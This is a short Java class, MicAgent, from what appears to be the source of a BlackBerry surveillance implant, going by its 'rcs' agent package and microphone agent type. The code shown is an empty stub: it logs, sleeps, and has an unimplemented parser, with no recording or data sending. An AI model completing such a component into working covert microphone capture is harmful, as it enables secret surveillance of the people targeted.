package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class MicAgent extends Agent {
    static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);

    public MicAgent(int AgentStatus) {
        super(Agent.AGENT_MIC, AgentStatus, true);

    }

    protected MicAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
